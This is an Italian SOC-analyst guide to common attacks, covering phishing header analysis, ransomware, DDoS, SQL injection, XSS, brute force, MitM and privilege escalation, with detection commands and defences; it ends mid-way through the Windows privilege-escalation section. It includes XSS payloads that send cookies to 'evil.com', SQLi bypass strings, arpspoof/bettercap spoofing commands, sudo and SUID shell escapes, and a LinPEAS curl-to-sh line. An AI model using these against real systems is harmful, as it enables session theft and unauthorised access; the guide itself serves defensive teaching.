# 🛡️ Attacchi Comuni

## Panoramica delle Categorie di Attacco

Il framework **MITRE ATT&CK** classifica le tecniche e tattiche utilizzate dagli attaccanti in un modello strutturato. Le principali categorie di attacco che un SOC Analyst deve conoscere sono:

| Categoria | Descrizione | Esempi MITRE ATT&CK |
|-----------|-------------|----------------------|
| **Social Engineering** | Manipolazione psicologica delle persone | Phishing (T1566), Spear Phishing (T1566.001/.002/.003) |
| **Malware** | Software malevolo progettato per danneggiare | Ransomware (T1486), Trojan, Worm, Rootkit |
| **Attacchi di Rete** | Sfruttamento delle vulnerabilità di rete | MitM (T1557), DDoS, ARP Spoofing |
| **Attacchi Web** | Targeting di applicazioni web | SQLi (T1190), XSS, CSRF, SSRF |
| **Attacchi di Autenticazione** | Compromissione delle credenziali | Brute Force (T1110), Credential Stuffing, Pass-the-Hash (T1550.002) |
| **Privilege Escalation** | Ottenimento di permessi superiori | Exploitation for Privilege Escalation (T1068), UAC Bypass (T1548.002) |
| **Supply Chain** | Compromissione della catena di fornitura | Supply Chain Compromise (T1195) |
| **Living off the Land** | Uso di strumenti legittimi per scopi malevoli | LOLBins (T1218), PowerShell (T1059.001) |

> **Nota:** Per ogni tipo di attacco includiamo: descrizione dettagliata, funzionamento tecnico, indicatori per il SOC e strategie di difesa.

---

## 🎣 Phishing e Spear Phishing

### Varianti di Phishing

| Tipo | Bersaglio | Mezzo | Descrizione |
|------|-----------|-------|-------------|
| **Phishing generico** | Massa indiscriminata | Email | Email generiche inviate a migliaia di destinatari con link o allegati malevoli |
| **Spear Phishing** | Individuo/gruppo specifico | Email | Email personalizzate con informazioni reali sulla vittima (nome, ruolo, azienda) |
| **Whaling** | C-Level (CEO, CFO, CTO) | Email | Spear phishing mirato ai dirigenti aziendali, spesso con richieste finanziarie |
| **Vishing** | Chiunque | Telefono (Voice) | Phishing vocale tramite chiamata telefonica, spesso fingendosi banche o supporto IT |
| **Smishing** | Chiunque | SMS | Phishing tramite SMS con link malevoli (es. "Il tuo pacco è in attesa") |

### Come Riconoscere un'Email di Phishing: Header Analysis

Gli header di un'email contengono informazioni cruciali per determinare la sua autenticità. I campi principali da analizzare sono:

| Header | Cosa Controllare | Segnale Sospetto |
|--------|------------------|------------------|
| **Return-Path** | Indirizzo reale del mittente | Diverso dal campo `From:` visibile |
| **Received** | Catena dei server di transito | Server sconosciuti, IP di paesi inattesi |
| **X-Mailer** | Software usato per inviare | Tool di mass mailing (PHPMailer, SendGrid usato impropriamente) |
| **Message-ID** | Identificativo unico del messaggio | Dominio nel Message-ID diverso dal mittente dichiarato |
| **X-Originating-IP** | IP di origine | IP geolocalizzato in un paese diverso da quello del mittente |

### SPF, DKIM e DMARC

Questi tre protocolli lavorano insieme per autenticare le email:

**SPF (Sender Policy Framework)**
- Definisce quali server IP sono autorizzati a inviare email per un dominio
- Il record SPF è un record DNS TXT
- Verifica: il server ricevente confronta l'IP del mittente con il record SPF del dominio

```bash
# Verificare il record SPF di un dominio
nslookup -type=txt example.com
dig TXT example.com

# Esempio di record SPF
# "v=spf1 ip4:192.168.1.0/24 include:_spf.google.com -all"
# -all = rifiuta tutto ciò che non corrisponde (hard fail)
# ~all = soft fail (accetta ma segna come sospetto)
```

**DKIM (DomainKeys Identified Mail)**
- Aggiunge una firma digitale crittografica all'header dell'email
- Il server ricevente verifica la firma usando la chiave pubblica nel DNS del mittente
- Garantisce che il contenuto non sia stato alterato in transito

```bash
# Verificare il record DKIM
dig TXT selector1._domainkey.example.com

# Nell'header dell'email, cercare:
# DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1; ...
# Authentication-Results: dkim=pass header.d=example.com
```

**DMARC (Domain-based Message Authentication, Reporting & Conformance)**
- Politica che dice ai server riceventi cosa fare se SPF e DKIM falliscono
- Politiche: `none` (solo monitoraggio), `quarantine` (spam), `reject` (rifiuta)

```bash
# Verificare il record DMARC
dig TXT _dmarc.example.com

# Esempio: "v=DMARC1; p=reject; rua=mailto:dmarc@example.com"
```

### Esempio Concreto di Email Sospetta

```
Return-Path: <support@amaz0n-security.com>       ← Dominio sospetto (0 al posto di o)
Received: from mail.suspicious-server.ru (185.234.xx.xx)  ← Server russo
    by mx.victim-company.com; Mon, 23 Jun 2026 10:15:33 +0200
From: "Amazon Security Team" <security@amazon.com>  ← From visibile diverso dal Return-Path!
To: mario.rossi@victim-company.com
Subject: ⚠️ Il tuo account è stato compromesso - Azione immediata richiesta
X-Mailer: PHPMailer 6.5.3                        ← Tool di invio massivo
Message-ID: <abc123@suspicious-server.ru>         ← Dominio nel Message-ID non è Amazon
X-Originating-IP: 185.234.xx.xx                  ← IP russo, non Amazon
Authentication-Results: mx.victim-company.com;
    spf=fail (sender IP is 185.234.xx.xx);       ← SPF FAIL
    dkim=none;                                    ← Nessuna firma DKIM
    dmarc=fail action=reject                      ← DMARC FAIL

Content-Type: text/html; charset="UTF-8"

[Corpo dell'email con link a http://amaz0n-security.com/verify?id=xyz]
```

**Segnali di allarme identificati:**
1. `Return-Path` diverso dal `From:` visibile
2. Server di origine in Russia (`suspicious-server.ru`)
3. SPF fail, DKIM assente, DMARC fail
4. Dominio typosquatting (`amaz0n` con lo zero)
5. Uso di PHPMailer (insolito per Amazon)
6. Tono urgente nel soggetto (pressione psicologica)

### Procedura Operativa SOC per Report di Phishing

**Step 1 — Ricevere e registrare il report**
- Creare un ticket nel sistema di ticketing (es. TheHive, ServiceNow)
- Annotare chi ha segnalato, quando, se ha cliccato su link o aperto allegati

**Step 2 — Analizzare gli header dell'email**
- Esportare il file `.eml` o `.msg` originale
- Analizzare Return-Path, Received, SPF/DKIM/DMARC
- Verificare il dominio del mittente su whois e VirusTotal

**Step 3 — Analizzare link e allegati**
- Estrarre URL dal corpo dell'email (senza cliccare!)
- Verificare su: VirusTotal, URLScan.io, Any.Run
- Se ci sono allegati: analizzarli in sandbox (Any.Run, Hybrid Analysis, Joe Sandbox)

```bash
# Estrarre hash dell'allegato
sha256sum allegato_sospetto.pdf
# Cercare su VirusTotal
# https://www.virustotal.com/gui/file/<HASH>
```

**Step 4 — Determinare l'impatto**
- L'utente ha cliccato sul link? Ha inserito credenziali?
- Ha aperto l'allegato? Se sì, il dispositivo potrebbe essere compromesso

**Step 5 — Contenimento e risposta**
- Bloccare il dominio/IP malevolo su firewall e proxy
- Se credenziali compromesse: reset password immediato + MFA
- Se allegato aperto: isolare il dispositivo dalla rete, avviare scansione EDR
- Aggiungere gli IOC alla blocklist del SIEM

**Step 6 — Comunicazione**
- Informare il team di security e, se necessario, il management
- Inviare un avviso agli altri utenti se l'attacco è diffuso

### IOC Tipici del Phishing

- **Domini typosquatting:** `micros0ft.com`, `paypa1.com`, `amaz0n-security.com`
- **URL abbreviati sospetti:** `bit.ly/xyz123`, `tinyurl.com/abc`
- **Allegati pericolosi:** `.exe`, `.scr`, `.js`, `.vbs`, `.docm` (macro Word), `.iso`, `.img`
- **Hash di allegati malevoli** già noti su VirusTotal
- **IP di C2** nei header dell'email

---

## 🔒 Ransomware

### Ciclo di Attacco Completo

```
1. Initial Access          → Phishing email con allegato malevolo, RDP esposto, exploit di vulnerabilità
        ↓
2. Execution               → Esecuzione del payload (PowerShell, macro VBA, script)
        ↓
3. Persistence             → Creazione di scheduled task, registry key, servizi
        ↓
4. Privilege Escalation    → Exploit del kernel, token manipulation, UAC bypass
        ↓
5. Defense Evasion         → Disabilitazione antivirus, offuscamento, LOLBins
        ↓
6. Credential Access       → Mimikatz, LSASS dump, Kerberoasting
        ↓
7. Lateral Movement        → PsExec, WMI, RDP, SMB, Pass-the-Hash
        ↓
8. Exfiltration            → Copia dei dati sensibili su server esterno (double extortion)
        ↓
9. Encryption              → Cifratura dei file con RSA/AES, cancellazione shadow copy
        ↓
10. Ransom Note            → Richiesta di riscatto in criptovaluta (Bitcoin, Monero)
```

### Esempi Famosi Dettagliati

**WannaCry (Maggio 2017)**
- **Exploit:** EternalBlue (MS17-010) — vulnerabilità nel protocollo SMBv1 di Windows
- **Propagazione:** Worm — si diffondeva automaticamente nella rete senza interazione utente
- **Kill Switch:** Marcus Hutchins scoprì un dominio hard-coded che, se registrato, fermava la propagazione
- **Impatto:** 200.000+ computer in 150 paesi, NHS UK paralizzato, danni per miliardi
- **Lezione:** Importanza del patching. La patch MS17-010 era disponibile da 2 mesi prima dell'attacco

**NotPetya (Giugno 2017)**
- **Vettore iniziale:** Supply chain attack — aggiornamento compromesso del software ucraino M.E.Doc
- **Tecniche:** Usava EternalBlue + Mimikatz per lateral movement
- **Wiper mascherato:** Non era un vero ransomware — non c'era modo di decifrare i file (distruttivo)
- **Impatto:** Maersk (300M$ di danni), FedEx, Merck — danni totali stimati 10+ miliardi $
- **Attribuzione:** Attribuito alla Russia (GRU), attacco geopolitico contro l'Ucraina

**LockBit**
- **Modello:** Ransomware-as-a-Service (RaaS) — gli affiliati usano il ransomware in cambio di una percentuale
- **Caratteristiche:** Cifratura molto veloce, auto-propagazione nella rete
- **Estorsione:** Triple extortion (cifratura + esfiltrazione dati + DDoS contro la vittima)
- **Leak site:** Sito .onion dove pubblicano i dati delle vittime che non pagano

**Conti**
- **Modello:** Double extortion — cifrano i file E minacciano di pubblicare i dati rubati
- **Organizzazione:** Operava come un'azienda con dipartimenti (HR, sviluppo, negoziazione)
- **Fine:** Conti leaks (2022) — un ricercatore ucraino ha leakato le chat interne del gruppo
- **Impatto:** Costa Rica dichiarò emergenza nazionale dopo un attacco Conti

### Indicatori di Compromissione (IOC) Ransomware

| Tipo IOC | Esempio |
|----------|---------|
| Estensioni file | `.locked`, `.encrypted`, `.crypt`, `.lockbit`, `.conti` |
| Note di riscatto | `README.txt`, `DECRYPT_INSTRUCTIONS.html`, `HOW_TO_RECOVER.txt` |
| C2 Traffic | Connessioni a domini/IP noti su Tor, beacon regolari (Cobalt Strike) |
| Processi sospetti | `vssadmin.exe delete shadows`, `bcdedit.exe /set {default} recoveryenabled no` |
| Registry Keys | Persistence in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| Servizi disabilitati | Volume Shadow Copy (VSS), Windows Defender, backup services |

### Comandi per Rilevare Attività Ransomware

```powershell
# Verificare se le Shadow Copy sono state cancellate (Windows)
vssadmin list shadows

# Cercare processi che cancellano shadow copy
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
  Where-Object { $_.Message -match "vssadmin|bcdedit|wbadmin" }

# Cercare file con estensioni ransomware comuni
Get-ChildItem -Path C:\ -Recurse -Include *.locked,*.encrypted,*.crypt -ErrorAction SilentlyContinue

# Controllare note di riscatto
Get-ChildItem -Path C:\ -Recurse -Include README.txt,DECRYPT*,HOW_TO_RECOVER* -ErrorAction SilentlyContinue

# Verificare connessioni di rete sospette (C2)
netstat -ano | findstr ESTABLISHED
Get-NetTCPConnection -State Established | Select RemoteAddress, RemotePort, OwningProcess

# Controllare processi sospetti
Get-Process | Where-Object { $_.ProcessName -match "powershell|cmd|wscript|cscript" } |
  Select ProcessName, Id, Path
```

```bash
# Linux — cercare file cifrati di recente
find / -name "*.encrypted" -o -name "*.locked" -mtime -1 2>/dev/null

# Controllare connessioni sospette
ss -tulnp | grep ESTABLISHED
netstat -tulnp | grep ESTABLISHED

# Controllare processi anomali
ps aux | grep -E "(openssl|gpg|curl|wget)" | grep -v grep
```

---

## 🌊 DDoS / DoS

### Differenza DoS vs DDoS

| Caratteristica | DoS (Denial of Service) | DDoS (Distributed Denial of Service) |
|----------------|------------------------|---------------------------------------|
| **Sorgente** | Singola macchina | Migliaia/milioni di macchine (botnet) |
| **Potenza** | Limitata dalla banda dell'attaccante | Banda aggregata di tutta la botnet |
| **Difficoltà di mitigazione** | Relativamente facile (blocca un IP) | Molto difficile (migliaia di IP diversi) |
| **Esempio** | Slowloris da un singolo server | Mirai botnet (IoT devices) |

### Tipi di Attacco DDoS

**1. Volumetrico (Layer 3-4)** — Saturare la banda
| Tecnica | Come Funziona | Amplificazione |
|---------|---------------|----------------|
| UDP Flood | Invio massivo di pacchetti UDP a porte casuali | 1:1 |
| DNS Amplification | Query DNS con IP sorgente spoofato della vittima → il DNS risponde alla vittima | Fino a 54x |
| NTP Amplification | Comando `monlist` a server NTP vulnerabili con IP spoofato | Fino a 556x |
| Memcached Amplification | Query a server Memcached esposti su internet | Fino a 51.000x |

**2. Protocol (Layer 3-4)** — Esaurire le risorse di stato
| Tecnica | Come Funziona |
|---------|---------------|
| SYN Flood | Invio massivo di pacchetti SYN senza completare il three-way handshake → riempimento della tabella delle connessioni |
| Ping of Death | Invio di pacchetti ICMP frammentati che superano i 65.535 byte |
| Smurf Attack | Ping all'indirizzo broadcast con IP sorgente spoofato della vittima |

**3. Application Layer (Layer 7)** — Esaurire le risorse dell'applicazione
| Tecnica | Come Funziona |
|---------|---------------|
| HTTP Flood | Richieste HTTP GET/POST apparentemente legittime in massa |
| Slowloris | Connessioni HTTP aperte ma mai completate, occupando tutti gli slot del web server |
| RUDY (R-U-Dead-Yet) | Invio molto lento di dati POST, tenendo le connessioni aperte |

### Come Riconoscerlo dai Log

```
# Esempio di log Apache durante un HTTP Flood
# Notare: stesso User-Agent, migliaia di richieste al secondo, da IP diversi

185.234.xx.1 - - [23/Jun/2026:14:22:01 +0200] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
185.234.xx.2 - - [23/Jun/2026:14:22:01 +0200] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
185.234.xx.3 - - [23/Jun/2026:14:22:01 +0200] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
103.45.xx.10 - - [23/Jun/2026:14:22:01 +0200] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
103.45.xx.11 - - [23/Jun/2026:14:22:01 +0200] "GET / HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
# ... migliaia di righe simili nello stesso secondo

# Pattern sospetti:
# 1. Stesso User-Agent identico per tutti gli IP (bot)
# 2. Stesso endpoint richiesto ripetutamente
# 3. Tasso di richieste enormemente superiore alla norma
# 4. IP provenienti da range geografici insoliti
```

```
# Esempio di SYN Flood nei log del firewall
Jun 23 14:22:01 fw01 kernel: TCP: SYN flooding on port 80. Sending cookies.
Jun 23 14:22:01 fw01 kernel: possible SYN flooding on port 443, sending cookies.

# Verificare con netstat
# Migliaia di connessioni in stato SYN_RECV indicano SYN flood
$ netstat -an | grep SYN_RECV | wc -l
15234
```

### Strumenti di Mitigazione

| Strumento/Tecnica | Tipo | Descrizione |
|-------------------|------|-------------|
| **Cloudflare / Akamai** | CDN + DDoS Protection | Assorbono il traffico volumetrico prima che raggiunga l'origine |
| **AWS Shield** | Cloud-based | Protezione DDoS integrata per servizi AWS |
| **SYN Cookies** | Kernel-level | Il server non alloca risorse finché il three-way handshake non è completo |
| **Rate Limiting** | Applicativo/Firewall | Limita il numero di richieste per IP/secondo |
| **GeoBlocking** | Firewall/CDN | Blocca il traffico da paesi da cui non ci si aspetta utenti |
| **Blackhole Routing** | ISP-level | Il traffico verso l'IP attaccato viene instradato verso un "buco nero" |
| **Anycast** | Infrastruttura | Distribuisce il traffico su più data center globali |

---

## 💉 SQL Injection

### Come Funziona — Esempio Pratico

**Scenario:** Un'applicazione web con un form di login che costruisce la query SQL dinamicamente.

**URL originale:**
```
https://example.com/login?user=admin&pass=password123
```

**Codice vulnerabile (PHP):**
```php
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "' AND password = '" . $_GET['pass'] . "'";
```

**Query SQL originale (legittima):**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

**Input dell'attaccante:**
```
user: admin' OR '1'='1' --
pass: qualsiasi
```

**Query manipolata:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'qualsiasi'
-- Il -- commenta il resto della query
-- La condizione OR '1'='1' è sempre vera → accesso garantito senza password
```

### Tipi di SQL Injection

| Tipo | Sottotipo | Come Funziona |
|------|-----------|---------------|
| **In-band** | Union-based | Usa `UNION SELECT` per estrarre dati da altre tabelle |
| **In-band** | Error-based | Sfrutta i messaggi di errore SQL per estrarre informazioni |
| **Blind** | Boolean-based | Non mostra output diretto ma l'applicazione si comporta diversamente (true/false) |
| **Blind** | Time-based | Usa funzioni come `SLEEP(5)` — se la risposta ritarda, la condizione è vera |
| **Out-of-band** | DNS/HTTP | I dati vengono esfiltrati tramite richieste DNS o HTTP verso un server controllato dall'attaccante |

**Esempio Union-based:**
```sql
' UNION SELECT username, password FROM users --
-- Aggiunge i risultati di un'altra query all'output originale
```

**Esempio Time-based Blind:**
```sql
' OR IF(1=1, SLEEP(5), 0) --
-- Se la pagina impiega 5 secondi a rispondere, il server è vulnerabile
```

### Come Si Vede nei Log del Web Server

```
# Log Apache con tentativi di SQL Injection

# Union-based SQLi
192.168.1.100 - - [23/Jun/2026:15:30:22 +0200] "GET /products?id=1'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1" 200 5234

# Error-based SQLi
192.168.1.100 - - [23/Jun/2026:15:30:45 +0200] "GET /products?id=1'+AND+1=CONVERT(int,(SELECT+TOP+1+table_name+FROM+information_schema.tables))-- HTTP/1.1" 500 1234

# Time-based Blind SQLi
192.168.1.100 - - [23/Jun/2026:15:31:02 +0200] "GET /login?user=admin'+OR+IF(1=1,SLEEP(5),0)-- HTTP/1.1" 200 4523

# Pattern da cercare nei log:
# - Caratteri ' (apice singolo) nei parametri
# - Parole chiave SQL: UNION, SELECT, INSERT, UPDATE, DELETE, DROP
# - Commenti SQL: --, /*, #
# - Funzioni: SLEEP(), BENCHMARK(), CONVERT(), CAST()
# - information_schema (enumerazione del database)
```

### Prevenzione

**1. Prepared Statements (Parameterized Queries)**
```php
// VULNERABILE - Mai fare così
$query = "SELECT * FROM users WHERE username = '" . $input . "'";

// SICURO - Usare sempre prepared statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

```python
# Python con SQLAlchemy — SICURO
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

**2. WAF Rules (Web Application Firewall)**
```
# Esempio di regola ModSecurity (OWASP CRS)
SecRule ARGS "@rx (?i)(union.*select|insert.*into|delete.*from|drop.*table)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection tentativo rilevato'"
```

**3. Altre difese:**
- Input validation (whitelist, non blacklist)
- Principio del minimo privilegio per l'account database
- Escaping dell'input (ultima risorsa, meno sicuro dei prepared statements)
- Disabilitare i messaggi di errore dettagliati in produzione

---

## ⚡ Cross-Site Scripting (XSS)

### Reflected XSS

L'input malevolo viene inviato in una richiesta e il server lo "riflette" nella risposta senza sanificarlo.

**Esempio:**
```
# URL malevolo inviato alla vittima
https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

# Il server risponde con:
<p>Risultati per: <script>document.location='https://evil.com/steal?cookie='+document.cookie</script></p>

# Il browser della vittima esegue lo script → i cookie vengono inviati all'attaccante
```

**Impatto:** Furto di sessione, redirect a siti malevoli, keylogging.

### Stored XSS

Lo script malevolo viene salvato nel database del server (es. in un commento, profilo utente, post del forum). Ogni utente che visualizza quella pagina esegue lo script.

**Esempio:**
```html
<!-- L'attaccante inserisce questo commento in un forum -->
<script>
  fetch('https://evil.com/log?cookie=' + document.cookie);
</script>

<!-- Ogni volta che un utente carica la pagina del forum, lo script viene eseguito -->
<!-- Il cookie di sessione di ogni visitatore viene inviato all'attaccante -->
```

**Impatto:** Più pericoloso del Reflected XSS perché colpisce tutti gli utenti che visitano la pagina.

### DOM-based XSS

Lo script malevolo manipola il DOM (Document Object Model) direttamente nel browser, senza che il payload passi dal server.

**Esempio:**
```html
<!-- Codice JavaScript vulnerabile nella pagina -->
<script>
  // Il codice prende il valore dal fragment dell'URL (#)
  var name = document.location.hash.substring(1);
  document.getElementById("greeting").innerHTML = "Ciao, " + name;
</script>

<!-- URL malevolo -->
<!-- https://example.com/page#<img src=x onerror=alert(document.cookie)> -->

<!-- Il browser inserisce il tag <img> nel DOM -->
<!-- L'evento onerror esegue il codice JavaScript dell'attaccante -->
```

### Difese contro XSS

| Difesa | Descrizione |
|--------|-------------|
| **Output Encoding** | Codificare tutti i caratteri speciali prima di inserirli nell'HTML (`<` → `&lt;`, `>` → `&gt;`) |
| **Content Security Policy (CSP)** | Header HTTP che limita le sorgenti da cui il browser può caricare script |
| **HttpOnly Cookie Flag** | I cookie con flag `HttpOnly` non sono accessibili da JavaScript |
| **Input Validation** | Validare e sanificare l'input lato server (whitelist approach) |
| **Framework moderni** | React, Angular, Vue.js applicano auto-escaping per default |

```
# Esempio di Content Security Policy header
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self'
```

---

## 🔑 Brute Force e Credential Stuffing

### Differenze

| Caratteristica | Brute Force | Credential Stuffing |
|----------------|-------------|---------------------|
| **Approccio** | Prova tutte le combinazioni possibili | Usa coppie username/password da leak precedenti |
| **Velocità** | Lento (specialmente con password complesse) | Veloce (le credenziali sono già note) |
| **Prerequisito** | Nessuno | Database di credenziali rubate (combo lists) |
| **Tasso di successo** | Basso | Alto (molti utenti riusano le password!) |
| **Variante** | Dictionary Attack: usa liste di password comuni | Variante: Password Spraying (una password, molti utenti) |

### Come Rilevarli

#### Windows Event Log

```
# Event ID 4625 — Failed Logon (Tentativo di accesso fallito)
# Un numero elevato di 4625 dallo stesso IP = possibile brute force

# Event ID 4624 — Successful Logon
# Un 4624 dopo molti 4625 = brute force riuscito!

# Event ID 4648 — Logon Using Explicit Credentials
# Indica che qualcuno ha specificato credenziali diverse dalle proprie
```

```powershell
# PowerShell — Cercare tentativi di brute force su Windows
# Ultimi 100 eventi di login falliti
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4625
} -MaxEvents 100 | Select-Object TimeCreated,
    @{N='TargetUser';E={$_.Properties[5].Value}},
    @{N='SourceIP';E={$_.Properties[19].Value}},
    @{N='LogonType';E={$_.Properties[10].Value}}

# Contare login falliti per IP sorgente (ultimi 1000 eventi)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 1000 |
    Group-Object { $_.Properties[19].Value } |
    Sort-Object Count -Descending |
    Select-Object Count, Name -First 10

# Cercare un login riuscito (4624) dopo multipli fallimenti (4625)
# per lo stesso utente → possibile brute force riuscito
```

#### Linux

```bash
# Cercare tentativi di login falliti su SSH
grep "Failed password" /var/log/auth.log | tail -20

# Contare tentativi falliti per IP
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10

# Esempio output:
#   1523 185.234.xx.xx    ← 1523 tentativi! Sicuramente brute force
#     45 192.168.1.50
#      3 10.0.0.1

# Cercare login riusciti dopo molti fallimenti
grep "Accepted password" /var/log/auth.log | tail -10

# Fail2ban — verificare IP bannati
sudo fail2ban-client status sshd
```

### Esempio di Log con Pattern Brute Force

```
# /var/log/auth.log — Pattern chiaro di brute force SSH

Jun 23 14:22:01 server sshd[12345]: Failed password for root from 185.234.xx.xx port 54321 ssh2
Jun 23 14:22:02 server sshd[12346]: Failed password for root from 185.234.xx.xx port 54322 ssh2
Jun 23 14:22:02 server sshd[12347]: Failed password for admin from 185.234.xx.xx port 54323 ssh2
Jun 23 14:22:03 server sshd[12348]: Failed password for root from 185.234.xx.xx port 54324 ssh2
Jun 23 14:22:03 server sshd[12349]: Failed password for test from 185.234.xx.xx port 54325 ssh2
Jun 23 14:22:04 server sshd[12350]: Failed password for root from 185.234.xx.xx port 54326 ssh2
Jun 23 14:22:04 server sshd[12351]: Failed password for root from 185.234.xx.xx port 54327 ssh2
# ... centinaia di righe simili in pochi secondi
Jun 23 14:25:15 server sshd[12899]: Accepted password for root from 185.234.xx.xx port 55001 ssh2
# ^^^ LOGIN RIUSCITO dopo 3 minuti di tentativi — COMPROMISSIONE!

# Segnali:
# 1. Stesso IP sorgente per tutti i tentativi
# 2. Tentativi rapidissimi (più al secondo)
# 3. Vari username provati (root, admin, test)
# 4. Accepted password alla fine → l'attaccante è entrato
```

### Contromisure

| Contromisura | Descrizione |
|--------------|-------------|
| **Account Lockout** | Blocco dell'account dopo N tentativi falliti (es. 5 tentativi → blocco 30 min) |
| **MFA (Multi-Factor Authentication)** | Anche con password corretta, serve un secondo fattore |
| **Rate Limiting** | Limitare il numero di tentativi di login per IP/minuto |
| **CAPTCHA** | Dopo N tentativi falliti, richiedere la risoluzione di un CAPTCHA |
| **Fail2Ban** | Tool Linux che banna automaticamente gli IP dopo troppi tentativi |
| **Password Policy** | Minimo 12 caratteri, complessità, no riuso delle ultime N password |
| **Monitoraggio SIEM** | Alert su: >10 login falliti in 5 minuti dallo stesso IP |
| **IP Reputation** | Bloccare IP noti per attività malevole (threat intelligence feeds) |

---

## 🕵️ Man-in-the-Middle (MitM)

### Come Funziona

Un attacco MitM avviene quando l'attaccante si interpone tra due parti che comunicano, intercettando o modificando il traffico in transito.

**ARP Spoofing**
```
Situazione normale:
[Vittima] ←→ [Gateway/Router] ←→ [Internet]

Dopo ARP Spoofing:
[Vittima] ←→ [Attaccante] ←→ [Gateway/Router] ←→ [Internet]
                  ↓
          Intercetta tutto il traffico
```
L'attaccante invia pacchetti ARP falsi per associare il proprio MAC address all'IP del gateway, facendo sì che tutto il traffico della vittima passi attraverso la propria macchina.

**DNS Spoofing**
L'attaccante modifica le risposte DNS per reindirizzare la vittima a un sito malevolo controllato dall'attaccante (es. la vittima digita `banca.com` ma viene reindirizzata a un clone).

**SSL Stripping**
L'attaccante effettua il downgrade della connessione da HTTPS a HTTP. La vittima pensa di comunicare in sicurezza, ma il traffico è in chiaro.

### Strumenti Usati dagli Attaccanti

| Strumento | Funzione |
|-----------|----------|
| **Ettercap** | ARP spoofing e sniffing del traffico su LAN |
| **Bettercap** | Framework MitM moderno: ARP/DNS spoofing, SSL stripping, proxy HTTP |
| **mitmproxy** | Proxy HTTP/HTTPS interattivo per intercettare e modificare il traffico |
| **Wireshark** | Analisi dei pacchetti catturati |
| **arpspoof** | Tool dedicato per ARP spoofing (parte di dsniff) |
| **sslstrip** | SSL stripping — converte HTTPS in HTTP |

```bash
# Esempio di ARP spoofing con arpspoof
# L'attaccante si finge il gateway (192.168.1.1) verso la vittima (192.168.1.100)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Bettercap — ARP spoofing e sniffing
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on
```

### Come Rilevarlo e Difendersi

**Rilevamento:**
- **ARP table anomale:** Controllare se due IP diversi hanno lo stesso MAC address
- **Certificati SSL sospetti:** Il browser mostra warning su certificati non validi
- **Traffico non cifrato inatteso:** Connessioni HTTP dove ci si aspettava HTTPS

```bash
# Controllare la tabella ARP per duplicati
arp -a | sort

# Su Linux — rilevare ARP spoofing
arpwatch  # Monitora cambiamenti nella tabella ARP e invia alert
```

**Difese:**

| Difesa | Descrizione |
|--------|-------------|
| **HTTPS Everywhere** | Forzare HTTPS con HSTS (HTTP Strict Transport Security) |
| **Certificate Pinning** | L'applicazione accetta solo certificati specifici |
| **VPN** | Cifrare tutto il traffico end-to-end |
| **Static ARP Entries** | Configurare entry ARP statiche per il gateway |
| **802.1X / Network Access Control** | Autenticazione prima dell'accesso alla rete |
| **DNSSEC** | Firma digitale delle risposte DNS per prevenire DNS spoofing |

---

## ⬆️ Privilege Escalation

### Escalation Verticale vs Orizzontale

| Tipo | Da → A | Esempio |
|------|--------|---------|
| **Verticale** | Utente normale → Admin/Root | Un utente web ottiene accesso root al server |
| **Orizzontale** | Utente A → Utente B (stesso livello) | Un utente accede ai dati di un altro utente con gli stessi privilegi |

### Tecniche Comuni su Linux

| Tecnica | Descrizione | Comando per Trovare il Vettore |
|---------|-------------|-------------------------------|
| **SUID Binaries** | Binari con il bit SUID eseguono con i permessi del proprietario (spesso root) | `find / -perm -4000 -type f 2>/dev/null` |
| **Sudo Misconfiguration** | Comandi eseguibili con sudo senza password o con wildcard | `sudo -l` |
| **Kernel Exploit** | Exploit del kernel per ottenere root (es. DirtyCow, DirtyPipe) | `uname -a` (verificare versione kernel) |
| **Cron Jobs** | Script eseguiti come root con permessi di scrittura per utenti normali | `cat /etc/crontab; ls -la /etc/cron.*` |
| **Writable /etc/passwd** | Se `/etc/passwd` è scrivibile, si può aggiungere un utente root | `ls -la /etc/passwd` |
| **Capabilities** | Binari con capabilities elevate (es. `cap_setuid`) | `getcap -r / 2>/dev/null` |

```bash
# === Enumerazione per Privilege Escalation su Linux ===

# 1. Cercare binari SUID
find / -perm -4000 -type f 2>/dev/null
# Output sospetto: /usr/bin/find con SUID → GTFOBins: find . -exec /bin/sh -p \;

# 2. Controllare sudo
sudo -l
# Output sospetto: (ALL) NOPASSWD: /usr/bin/vim
# Exploit: sudo vim -c ':!sh'

# 3. Cercare file scrivibili in directory root
find / -writable -type f 2>/dev/null | grep -v proc

# 4. Controllare le variabili d'ambiente
env | grep -i path
# PATH hijacking: se /tmp è nel PATH prima di /usr/bin, puoi creare un binario malevolo

# 5. Controllare la versione del kernel
uname -a
cat /etc/os-release
# Cercare exploit: searchsploit linux kernel <versione>

# 6. Tool automatici
# LinPEAS — script di enumerazione completo
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### Tecniche Comuni su Windows

| Tecnica | Descrizione | Comando |
|---------|-------------|---------|
| **Token Manipulation** | Duplicare o impersonare un token di un processo privilegiato | `whoami /priv` |
| **UAC Bypass** | Aggirare il User Account Control per eseguire come amministratore | Varie tecniche (fodhelper, eventvwr) |
